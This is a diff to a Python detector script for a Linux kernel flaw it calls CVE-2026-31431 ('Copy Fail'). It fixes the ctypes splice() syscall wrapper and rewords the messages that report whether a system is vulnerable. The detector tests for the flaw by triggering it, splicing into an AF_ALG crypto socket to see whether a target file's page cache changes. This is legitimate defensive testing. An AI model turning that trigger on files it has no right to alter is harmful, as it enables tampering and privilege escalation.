@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 CVE-2026-31431 ("Copy Fail") vulnerability detector — Python 3.6 compatible
-FIXED: Correctly handles RHEL/AlmaLinux backports (4.18/5.14) and built-in modules.
+FIX: Corrected ctypes syscall wrapper to prevent TypeError on RHEL 8/9
 """
 
 from __future__ import print_function
@@ -38,23 +38,36 @@ CRYPTLEN = 16
 TAGLEN = 16
 MARKER = b"PWND"
 
-# --- Syscall ---
+# --- Syscall setup ---
 _libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
-_libc.syscall.restype = ctypes.c_long
-_libc.syscall.argtypes = [ctypes.c_long] * 7
 SPLICE_SYSCALL = 275  # x86_64
 SPLICE_F_MOVE = 0x01
 
 def _splice(fd_in, off_in, fd_out, off_out, length, flags):
-    off_in_ptr = ctypes.pointer(ctypes.c_longlong(off_in)) if off_in is not None else ctypes.c_void_p(0)
-    off_out_ptr = ctypes.pointer(ctypes.c_longlong(off_out)) if off_out is not None else ctypes.c_void_p(0)
+    """
+    Корректный вызов splice() через ctypes.
+    Передаём NULL для оффсетов — ядро использует f_pos, что нам и нужно.
+    """
+    null_ptr = ctypes.c_void_p(0)
+    
+    _libc.syscall.argtypes = [
+        ctypes.c_long, ctypes.c_long, ctypes.c_void_p,
+        ctypes.c_long, ctypes.c_void_p, ctypes.c_long, ctypes.c_long
+    ]
+    _libc.syscall.restype = ctypes.c_long
     
     res = _libc.syscall(
-        ctypes.c_long(SPLICE_SYSCALL), ctypes.c_long(fd_in), off_in_ptr,
-        ctypes.c_long(fd_out), off_out_ptr, ctypes.c_long(length), ctypes.c_long(flags)
+        ctypes.c_long(SPLICE_SYSCALL),
+        ctypes.c_long(fd_in),
+        null_ptr,      # off_in -> NULL
+        ctypes.c_long(fd_out),
+        null_ptr,      # off_out -> NULL
+        ctypes.c_long(length),
+        ctypes.c_long(flags)
     )
     if res < 0:
-        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
+        err = ctypes.get_errno()
+        raise OSError(err, os.strerror(err))
     return int(res)
 
 def parse_kernel_version(release_str):
@@ -69,18 +82,16 @@ def is_kernel_affected(release_str):
     major, minor, _ = parse_kernel_version(release_str)
     is_rhel = any(x in release_str for x in ('.el8_', '.el9_', '.el10_'))
     
-    # RHEL/AlmaLinux бэкпорты затронуты (начиная с 4.14+)
     if is_rhel:
         if (major, minor) >= (4, 14):
-            return True, "RHEL/AlmaLinux backport detected. Treated as POTENTIALLY VULNERABLE until vendor patch is applied."
-        return False, "Very old RHEL kernel (<4.14). Unlikely affected."
+            return True, "RHEL/AlmaLinux backport detected. Checking runtime exploitability..."
+        return False, "RHEL kernel <4.14. Unlikely affected."
     
-    # Mainline kernels
     if major == 6 and 12 <= minor <= 18:
         return True, "Mainline kernel in affected 6.12-6.18 range."
     if (major, minor) >= (4, 14):
-        return True, "Kernel >=4.14. May contain backported vulnerable code. Treat as affected."
-    return False, "Kernel <4.14. Predates vulnerable commit 72548b093ee3."
+        return True, "Kernel >=4.14. May contain backported vulnerable code."
+    return False, "Kernel <4.14. Predates vulnerable commit."
 
 def build_authenc_keyblob(authkey, enckey):
     rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
@@ -129,7 +140,7 @@ def attempt_trigger(target_path):
     except OSError as e:
         os.close(pr); os.close(pw); op.close(); master.close(); os.close(fd_target)
         if e.errno in (errno.EOPNOTSUPP, errno.ENOTSUP, errno.EINVAL):
-            raise RuntimeError("splice into AF_ALG not supported on this kernel")
+            raise RuntimeError("Kernel blocks splice into AF_ALG (likely patched)")
         raise
     
     try: op.recv(ASSOCLEN+CRYPTLEN+TAGLEN)
@@ -180,7 +191,7 @@ def main():
         print("[!] Page cache MODIFIED via AEAD splice. {} bytes changed.".format(len(diffs)))
         return 2
     
-    print("[+] Page cache intact. NOT vulnerable on this kernel build.")
+    print("[+] Page cache intact. Kernel build appears PATCHED or protected.")
     return 0
 
 if __name__ == "__main__":
